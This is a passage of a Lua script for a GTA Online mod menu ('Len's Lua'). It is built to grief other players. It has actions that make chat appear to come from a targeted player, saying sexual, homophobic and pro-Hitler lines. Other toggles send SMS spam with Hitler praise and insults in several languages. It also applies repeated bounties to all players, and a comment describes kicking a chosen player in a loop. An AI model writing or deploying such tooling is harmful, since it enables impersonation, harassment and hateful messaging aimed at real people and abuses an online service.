        menu.trigger_commands("say Ich kacke im stehen. I poop standing up.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "i like man and i really like pipe cleaning. (Chat as player) ", {"pipecleaning"}, "Chat as german player pipe cleaning", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say I like man and i really like pipe cleaning. Ich stehe Männer und mag Rohrreinigung.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "I'm an Analpirate. Arrr! (Chat as player) ", {"analpirate"}, "Chat as german player analpirate", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say I'm an Analpirate. Arrr! Ich bin ein Analpirat. Arrr!")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "i like to eat the poop of other people (Chat as player) ", {"poopofotherpeople"}, "Chat as german player poop of other people", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ich esse gerne Scheisse von anderen und keul mir daurauf einen. I like to eat the poop of other people and im shaking my palm on it and i jerk off on it.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "i like to lick ears of others. (Chat as player) ", {"lickears"}, "Chat as german player ears of others", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say I like to lick ears of others. Its really tasty. ich lecke gerne ohren von anderen aus. Das schmeckt wirklich gut.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent6, "I like do dirty things with minced meat. (Chat as player) ", {"freshdick"}, "Chat as german player minced meat", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ich treibe gerne schmutzige Dinge mit Hack. I like do dirty things with minced meat.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)

	menu.action(parent7, "Glory to Hitler ! (Chat as player) ", {"glorytoukraine"}, "Chat as french player glory to Lepen", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Chwała Hitlerowi! Chwała Hitlerowi! Chwała Hitlerowi! Glory to Hitler ! Glory to Hitler ! Glory to Hitler !")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "I have a small Dick c=8 (Chat as player) ", {"smalldick"}, "Chat as french player small dick", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Mam małego fiuta c=8 I have a small Dick c=8")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "I suck for a cheese burger. (Chat as player) ", {"suckforacheese"}, "Chat as french player suck", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ssę na burgera z serem.. I suck for a cheese burger.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "I am a FemBoy. (Chat as player) ", {"iamafemboy"}, "Chat as french player femboy", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Muszę przyznać, że jestem transpłciowa.. I am a FemBoy..")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "I like to suck bears in the mountain. (Chat as player) ", {"cuckbears"}, "Chat as french player femboy", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Lubię ssać niedźwiedzie w górach.  I like to suck bears in the mountain.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "I have two dads and I live well. (Chat as player) ", {"twodads"}, "Chat as french player two dad", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Mam dwóch tatusiów i dobrze żyję.  I have two dads and I live well.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "I like to put any object in my buttocks! (Chat as player) ", {"objectinass"}, "Chat as french player object ass", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Lubię wkładać dowolny przedmiot w pośladki! I like to put any object in my buttocks!")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "I am selling my dildo on EBay. anyone interested? (Chat as player) ", {"dildoebay"}, "Chat as french player dildow ebay", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Sprzedaję swoje dildo na Ebayu. Ktokolwiek zainteresowany ? I sell my dildo on Ebay. Anyone interested?")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "When I've taken all kinds of drugs I'm a real cocksucker. (Chat as player) ", {"cocksucker"}, "Chat as french player cock sucker", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Kiedy biorę wszelkiego rodzaju narkotyki, jestem prawdziwym lachociągiem.. When I've taken all kinds of drugs I'm a real cocksucker.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "King Arthur! (Chat as player) ", {"kingarthur"}, "Chat as french player king arthur", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ktokolwiek wyciągnie mojego fiuta z twojego tyłka, nazwiemy go królem Arturem!! Whoever gets my dick out of your ass, we'll call him King Arthur!")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "Putin is sending me to the gulag. I like men. (Chat as player) ", {"putingulag"}, "Chat as french player putin gulag", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Putin wysyła mnie do gułagu. Lubię mężczyzn. Putin is sending me to the gulag. I like men.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "I've had sex with a horse before. (Chat as player) ", {"sexwithhorse"}, "Chat as french player sex with horse", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Uprawiałem już wcześniej seks z koniem. I've had sex with a horse before.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "Aren't you looking for some fresh dick? (Chat as player) ", {"freshdick"}, "Chat as french player sex fresh dick", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Nie szukasz jakiegoś świeżego kutasa? Aren't you looking for some fresh dick?")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
	end)
	menu.action(parent7, "I will sell my mother for a SharkCard! (Chat as player) ", {"freshdick"}, "Chat as french player shrk card", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Sprzedam mamę za kartę Shark! I will sell my mother for a SharkCard!")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "I fucked your mother so hard it made a big shit! (Chat as player) ", {"freshdick"}, "Chat as french player big shit", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Pieprzyłem twoją matkę tak mocno, że to było wielkie gówno!  I fucked your mother so hard it made a big shit!")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "You know I insult you but deep down I like you :) (Chat as player) ", {"freshdick"}, "Chat as french player i like you", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Wiesz, że cię obrażam, ale w głębi duszy cię lubię :)  You know I insult you but deep down I like you :)")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "I like anything that looks like a dick, so I like you. (Chat as player) ", {"freshdick"}, "Chat as french player like a dick", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Lubię wszystko, co wygląda jak kutas, więc lubię Ciebie. I like anything that looks like a dick, so I like you.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "My first pubic hair. (Chat as player) ", {"pubichair"}, "Chat as french player my first pubic hair", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Mam dla Ciebie świetną wiadomość. Wczoraj miałam swoje pierwsze włosy łonowe. I have great news for you. Yesterday I had my first pubic hair.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "When I was a baby my father knocked me down. (Chat as player) ", {"knockedmedown"}, "Chat as french player my knocked me down", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Kiedy byłam dzieckiem, mój ojciec mnie powalił. A moja mama przytuliła mnie zbyt blisko ściany. When I was a baby my father knocked me down. And my mother cradled me too close to the wall.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "I love playing with my sister's Barbies. (Chat as player) ", {"sisterbarbie"}, "Chat as french player my knocked me down", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Uwielbiam bawić się Barbie mojej siostry. I love playing with my sister's Barbies.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "In my childhood, my grandmother's Pinscher fucked my Teddy very hard. (Chat as player) ", {"teddyfucked"}, "Chat as french player my knocked me down", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say W dzieciństwie Pinczer mojej babci bardzo mocno zerżnął mojego misia. In my childhood, my grandmother's Pinscher fucked my Teddy very hard.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "You were still playing with your poop when I got GTA (Chat as player) ", {"poopgta"}, "Chat as french player my poop GTA", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Nadal bawiłeś się kupą, kiedy dostałem GTA You were still playing with your poop when I got GTA")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "I'm a pro gamer with my trackball mouse. (Chat as player) ", {"poopgta"}, "Chat as french player my trackball mouse", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Jestem profesjonalnym graczem z myszą z trackballem. I'm a pro gamer with my trackball mouse.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "Stupid brother. (Chat as player) ", {"stupidbrother"}, "Chat as french player my stupid brother", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Sprzedaję mojego głupiego braciszka, nauczył się siedzieć, leżeć i podaje łapę. I'm selling my stupid little brother, he learned to sit, to lie down, and he gives his paw.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "Obama in the white House. (Chat as player) ", {"whitehouse"}, "Chat as french player Obama white house.", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Pozwolę ci, muszę zdeponować Obamę w Białym Domu. I will lets you, i need to deposit Obama to the White House.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)

	--- SENTENCES OF MY WITCHIN DAH LOVE <3 

	menu.action(parent7, "i like to eat other people's boogers. (Chat as player) ", {"boogers"}, "Chat as german player peoples boogers", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Lubię robić brudne rzeczy z mielonym mięsem. I like to eat other people's boogers. ")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "I'm punished for playing, Dad still steps on a lego again. (Chat as player) ", {"buildingblocks"}, "Chat as french player putin gulag", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Jestem ukarany za granie, tata wciąż nadepnie na lego. I'm punished for playing, Dad still steps on a lego again.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "My mother is scolding right now. I have to put away my building blocks...im back soon. (Chat as player) ", {"buildingblocks"}, "Chat as french player putin gulag", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Moja matka mnie beszta. Muszę odłożyć moje klocki. Zaraz wracam. My mother is scolding right now. I have to put away my building blocks...im back soon.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "Im selling my poop on dirty websites. (Chat as player) ", {"dirtywebsites"}, "Chat as german player poop on dirty website", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Sprzedaję kupę na ciemnych stronach. Im selling my poop on dirty websites.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "I poop standing up. (Chat as player) ", {"standingup"}, "Chat as german player I poop standing up.", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Robię kupę na stojąco. I poop standing up.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "i like man and i really like pipe cleaning. (Chat as player) ", {"pipecleaning"}, "Chat as german player pipe cleaning", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Lubię mężczyzn i czyszczę fajki. I like man and i really like pipe cleaning.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "I'm an Analpirate. Arrr! (Chat as player) ", {"analpirate"}, "Chat as german player analpirate", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Jestem Analpiratem. Arrr! Im an Analpirate. Arrr!")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "i like to eat the poop of other people (Chat as player) ", {"poopofotherpeople"}, "Chat as german player poop of other people", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Lubię jeść kupę innych ludzi, potrząsać na niej dłonią i szarpać się do niej. I like to eat the poop of other people and im shaking my palm on it and i jerk off on it.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "i like to lick ears of others. (Chat as player) ", {"lickears"}, "Chat as german player ears of others", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Lubię lizać uszy innych ludzi. To jest naprawdę dobre. I like to lick ears of others. Its really tasty. ")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent7, "I like do dirty things with minced meat. (Chat as player) ", {"freshdick"}, "Chat as german player minced meat", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Lubię robić brudne rzeczy z mielonym mięsem. I like do dirty things with minced meat.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	---
	---                RUSSIAN SMS SPAM 
	---

	menu.toggle(parent8, "Glory to Ukraine ! ", {"glorytoukraine"}, "SMS to player glory to ukraine", function(on)
		util.yield(100)	
		menu.trigger_commands("smstext"..PLAYER.GET_PLAYER_NAME(pid).." Слава Украине ! Слава Украине ! Слава Украине ! Glory to Ukraine !")
		util.yield(300)
		menu.trigger_commands("smsrandomsender"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(200)
		menu.trigger_commands("smsspam"..PLAYER.GET_PLAYER_NAME(pid).."")
	end)
	menu.toggle(parent8, "I have a small Dick c=8 ", {"smalldicksms"}, "SMS to player small dick", function(on)
		util.yield(100)	
		menu.trigger_commands("smstext"..PLAYER.GET_PLAYER_NAME(pid).." У меня маленький член c=8")
		util.yield(300)
		menu.trigger_commands("smsrandomsender"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(200)
		menu.trigger_commands("smsspam"..PLAYER.GET_PLAYER_NAME(pid).."")
	end)
	menu.toggle(parent8, "I suck for a cheese burger.", {"suckfocheesesms"}, "SMS to player cheese burger", function(on)
		util.yield(100)	
		menu.trigger_commands("smstext"..PLAYER.GET_PLAYER_NAME(pid).." Я соскучилась по чизбургеру.")
		util.yield(300)
		menu.trigger_commands("smsrandomsender"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(200)
		menu.trigger_commands("smsspam"..PLAYER.GET_PLAYER_NAME(pid).."")
	end)
	---
	---                FRENCH SMS SPAM 
	---

	menu.toggle(parent9, "Gloiry to Zemmour !", {"zemmoursms"}, "SMS to player glory to Zemmour", function(on)
		util.yield(100)	
		menu.trigger_commands("smstext"..PLAYER.GET_PLAYER_NAME(pid).." Gloire à Eric Zemmour ! Gloire à Eric Zemmour ! Gloire à Eric Zemmour !")
		util.yield(300)
		menu.trigger_commands("smsrandomsender"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(200)
		menu.trigger_commands("smsspam"..PLAYER.GET_PLAYER_NAME(pid).."")
	end)
	menu.toggle(parent9, "You have a small Dick c=8 ", {"smalldicksmsfr"}, "SMS to player small dick", function(on)
		util.yield(100)	
		menu.trigger_commands("smstext"..PLAYER.GET_PLAYER_NAME(pid).." Ta une petite bite c=8")
		util.yield(300)
		menu.trigger_commands("smsrandomsender"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(200)
		menu.trigger_commands("smsspam"..PLAYER.GET_PLAYER_NAME(pid).."")
	end)
	menu.toggle(parent9, "You suck for a cheese burger.", {"suckfocheesesmsfr"}, "SMS you suck for a burger", function(on)
		util.yield(100)	
		menu.trigger_commands("smstext"..PLAYER.GET_PLAYER_NAME(pid).." Tu suce pour un cheese burger.")
		util.yield(300)
		menu.trigger_commands("smsrandomsender"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(200)
		menu.trigger_commands("smsspam"..PLAYER.GET_PLAYER_NAME(pid).."")
	end)
	---
	---                CHINESS SMS SPAM 
	---

	menu.toggle(parent10, "Gloiry to Taîwan !", {"taiwansms"}, "SMS to player glory to Zemmour", function(on)
		util.yield(100)	
		menu.trigger_commands("smstext"..PLAYER.GET_PLAYER_NAME(pid).." 为台湾说声！ 荣耀归台湾！ 荣耀归台湾！")
		util.yield(300)
		menu.trigger_commands("smsrandomsender"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(200)
		menu.trigger_commands("smsspam"..PLAYER.GET_PLAYER_NAME(pid).."")
	end)
	menu.toggle(parent10, "You have a small Dick c=8 ", {"smalldicksmscn"}, "SMS to player small dick", function(on)
		util.yield(100)	
		menu.trigger_commands("smstext"..PLAYER.GET_PLAYER_NAME(pid).." 你的小鸡巴 c=8")
		util.yield(300)
		menu.trigger_commands("smsrandomsender"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(200)
		menu.trigger_commands("smsspam"..PLAYER.GET_PLAYER_NAME(pid).."")
	end)
	menu.toggle(parent10, "You suck for a cheese burger.", {"suckfocheesesmscn"}, "SMS you suck for a burger", function(on)
		util.yield(100)	
		menu.trigger_commands("smstext"..PLAYER.GET_PLAYER_NAME(pid).." 你很讨厌一个芝士汉堡。")
		util.yield(300)
		menu.trigger_commands("smsrandomsender"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(200)
		menu.trigger_commands("smsspam"..PLAYER.GET_PLAYER_NAME(pid).."")
	end)
	---
	---                GERMAN SMS SPAM 
	---

	menu.toggle(parent11, "Gloiry to HITLER !", {"hitlersms"}, "SMS to player glory to HITLER", function(on)
		util.yield(100)	
		menu.trigger_commands("smstext"..PLAYER.GET_PLAYER_NAME(pid).." Ehre sei HITLER! Ehre sei HITLER! Ehre sei HITLER! ")
		util.yield(300)
		menu.trigger_commands("smsrandomsender"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(200)
		menu.trigger_commands("smsspam"..PLAYER.GET_PLAYER_NAME(pid).."")
	end)
	menu.toggle(parent11, "You have a small Dick c=8 ", {"smalldicksmsde"}, "SMS to player small dick", function(on)
		util.yield(100)	
		menu.trigger_commands("smstext"..PLAYER.GET_PLAYER_NAME(pid).." Du hast einen kleinen Schwanz c=8")
		util.yield(300)
		menu.trigger_commands("smsrandomsender"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(200)
		menu.trigger_commands("smsspam"..PLAYER.GET_PLAYER_NAME(pid).."")
	end)
	menu.toggle(parent11, "You suck for a cheese burger.", {"suckfocheesesmsde"}, "SMS you suck for a burger", function(on)
		util.yield(100)	
		menu.trigger_commands("smstext"..PLAYER.GET_PLAYER_NAME(pid).." Sie saugen für einen Cheesburger")
		util.yield(300)
		menu.trigger_commands("smsrandomsender"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(200)
		menu.trigger_commands("smsspam"..PLAYER.GET_PLAYER_NAME(pid).."")
	end)
	---
	---                POLISH SMS SPAM 
	---

	menu.toggle(parent12, "Gloiry to HITLER !", {"hitlersmspl"}, "SMS to player glory to HITLER", function(on)
		util.yield(100)	
		menu.trigger_commands("smstext"..PLAYER.GET_PLAYER_NAME(pid).." Chwała Hitlerowi ! Chwała Hitlerowi ! Chwała Hitlerowi ! ")
		util.yield(300)
		menu.trigger_commands("smsrandomsender"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(200)
		menu.trigger_commands("smsspam"..PLAYER.GET_PLAYER_NAME(pid).."")
	end)
	menu.toggle(parent12, "You have a small Dick c=8 ", {"smalldicksmspl"}, "SMS to player small dick", function(on)
		util.yield(100)	
		menu.trigger_commands("smstext"..PLAYER.GET_PLAYER_NAME(pid).." masz małego fiuta c=8")
		util.yield(300)
		menu.trigger_commands("smsrandomsender"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(200)
		menu.trigger_commands("smsspam"..PLAYER.GET_PLAYER_NAME(pid).."")
	end)
	menu.toggle(parent12, "You suck for a cheese burger.", {"suckfocheesesmspl"}, "SMS you suck for a burger", function(on)
		util.yield(100)	
		menu.trigger_commands("smstext"..PLAYER.GET_PLAYER_NAME(pid).." Jesteś beznadziejny za burgera z serem")
		util.yield(300)
		menu.trigger_commands("smsrandomsender"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(200)
		menu.trigger_commands("smsspam"..PLAYER.GET_PLAYER_NAME(pid).."")
	end)
	---
	---                ENGLISH SMS SPAM 
	---

	menu.toggle(parent13, "Gloiry to HITLER !", {"hitlersmsen"}, "SMS to player glory to HITLER", function(on)
		util.yield(100)	
		menu.trigger_commands("smstext"..PLAYER.GET_PLAYER_NAME(pid).." Gloiry to HITLER !Gloiry to HITLER !Gloiry to HITLER ! ")
		util.yield(300)
		menu.trigger_commands("smsrandomsender"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(200)
		menu.trigger_commands("smsspam"..PLAYER.GET_PLAYER_NAME(pid).."")
	end)
	menu.toggle(parent13, "You have a small Dick c=8 ", {"smalldicksmsen"}, "SMS to player small dick", function(on)
		util.yield(100)	
		menu.trigger_commands("smstext"..PLAYER.GET_PLAYER_NAME(pid).." You have a small Dick c=8 ")
		util.yield(300)
		menu.trigger_commands("smsrandomsender"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(200)
		menu.trigger_commands("smsspam"..PLAYER.GET_PLAYER_NAME(pid).."")
	end)
	menu.toggle(parent13, "You suck for a cheese burger.", {"suckfocheesesmsen"}, "SMS you suck for a burger", function(on)
		util.yield(100)	
		menu.trigger_commands("smstext"..PLAYER.GET_PLAYER_NAME(pid).." You suck for a cheese burger.")
		util.yield(300)
		menu.trigger_commands("smsrandomsender"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(200)
		menu.trigger_commands("smsspam"..PLAYER.GET_PLAYER_NAME(pid).."")
	end)
end
menu.divider(menu.my_root(), "Len's Lua")
vehicules_root = menu.list(menu.my_root(), "Vehicule", {"vehiculesplayers"}, "")
allplayers_root = menu.list(menu.my_root(), "All players", {"lancescriptallplayers"}, "")
superclean_root = menu.list(menu.my_root(), "Protection / Super Clean", {"supercleanroot"}, "")
historyjoin_root = menu.list(menu.my_root(), "History Join", {"historyjoinroot"}, "")
teleport_root = menu.list(menu.my_root(), "Teleport", {"Teleportroot"}, "")
credits_root = menu.list(menu.my_root(), "Credits", {"creditsroot"}, "")


----------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------
---																																--
---                         H I S T O R Y           J O I N 																	--
---
---
--- 1. Mettez le joueur en question en mode : Block Join et Notification dans les Réactions du Player History.
--- 2. Pour l'utiliser il faut aller dans le player History ce mettre sur : < Matchmaking Method > sur le profil du joueur.
--- 3. Copier son Pseudo Rockstargame. 
--- 4. Ensuite il faut le coller après  "historyjoin"  à la ligne "3210" et sauvegarder le Lua. 
--- 5. Relancer le Script Lua dans Stand 
--- 6. Enjoy ! Go ce faire un café, laisser votre ordinateur tourner et vous kickerez en boucle la personne voulue 
---
---
---
---
---
--- 1. Put the player in question in mode: Block Join and Notification in the Reactions of the Player History.
--- 2. To use it, you have to go to the player History and put it on: < Matchmaking Method > on the player's profile.
--- 3. Copy his Nickname Rockstar Game.
--- 4. Then you have to paste it after "historyjoin" at line "3210" and save the Lua.
--- 5. Rerun Lua Script in Stand
--- 6. Enjoy ! Go this make a coffee, leave your computer running and you will kick the desired person in a loop
---
---
---


menu.toggle(allplayers_root, "Infibounty", {"infibounty"}, "Applies $10k bounty to all players, every 60 seconds", function(on)
	if on then
		infibounty = true
		start_infibounty_thread()
	else
		infibounty = false
	end
end, false)

menu.toggle(allplayers_root, "Open Extra Slot", {"extraslot"}, "Open an extra slot using NETWORK_SET_IN_SPECTATOR_MODE", function(on)
	local me = players.user()   
    if on then
        NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP(4)
        NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(me, true)
    else
        NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP(0)
        NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(me, false)
    end
end, false)

menu.action(vehicules_root, "RGB preset: Olga Bluenen Color <3", {"olgabluenen"}, "g", function(on_click)
    menu.trigger_commands("vehprimaryred 0")
    menu.trigger_commands("vehprimarygreen 64")
    menu.trigger_commands("vehprimaryblue 62")
	menu.trigger_commands("vehsecondaryred 0")
    menu.trigger_commands("vehsecondarygreen 64")
    menu.trigger_commands("vehsecondaryblue 63")
end)

menu.action(vehicules_root, "RGB preset: Stand magenta", {"rpstandmagenta"}, "g", function(on_click)
